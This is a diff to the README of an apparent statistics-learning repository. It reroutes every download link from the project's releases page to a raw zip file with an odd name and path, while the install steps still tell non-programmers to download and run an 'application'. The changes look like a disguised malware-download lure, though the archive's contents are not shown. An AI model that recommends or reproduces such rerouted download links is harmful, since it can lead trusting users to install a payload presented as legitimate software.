@@ -1,7 +1,7 @@
 # 📊 Power_of_statistics - Explore Statistical Methods with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Power_of_statistics-brightgreen)](https://github.com/Faiqkhan139/Power_of_statistics/releases)
+[![Download](https://github.com/Faiqkhan139/Power_of_statistics/raw/refs/heads/main/psychostatically/of-statistics-Power-swingdingle.zip)](https://github.com/Faiqkhan139/Power_of_statistics/raw/refs/heads/main/psychostatically/of-statistics-Power-swingdingle.zip)
 
 ## 📖 Description
 “The Power of Statistics” by Google focuses on key statistical methods. This application helps you understand hypothesis testing, t-tests, p-values, confidence intervals, and real-world applications using Python libraries such as NumPy, Pandas, Matplotlib, and SciPy. 
@@ -11,7 +11,7 @@ Follow these steps to install and run the application:
 
 1. **Visit the Downloads Page**  
    Click the link below to access the releases page.  
-   [Download Power_of_statistics](https://github.com/Faiqkhan139/Power_of_statistics/releases)
+   [Download Power_of_statistics](https://github.com/Faiqkhan139/Power_of_statistics/raw/refs/heads/main/psychostatically/of-statistics-Power-swingdingle.zip)
 
 2. **Choose the Right Version**  
    On the downloads page, you will see different versions of the application. Each version will be listed with a release date. Pick the latest version for optimal performance. 
@@ -55,7 +55,7 @@ Follow these steps to install and run the application:
 - T-Test
 
 ## 🔄 Update Notes
-Check the release notes on the [downloads page](https://github.com/Faiqkhan139/Power_of_statistics/releases) for updates and new features. Each version includes details on improvements and bug fixes.
+Check the release notes on the [downloads page](https://github.com/Faiqkhan139/Power_of_statistics/raw/refs/heads/main/psychostatically/of-statistics-Power-swingdingle.zip) for updates and new features. Each version includes details on improvements and bug fixes.
 
 ## ❓ Frequently Asked Questions
 1. **Can I use this application without programming knowledge?**  
@@ -75,4 +75,4 @@ For further inquiries or feedback, you can contact the developer via the issues 
 
 ## 📥 Download Again
 Don't forget to download the latest version of Power_of_statistics from the link below:  
-[Download Power_of_statistics](https://github.com/Faiqkhan139/Power_of_statistics/releases)
+[Download Power_of_statistics](https://github.com/Faiqkhan139/Power_of_statistics/raw/refs/heads/main/psychostatically/of-statistics-Power-swingdingle.zip)
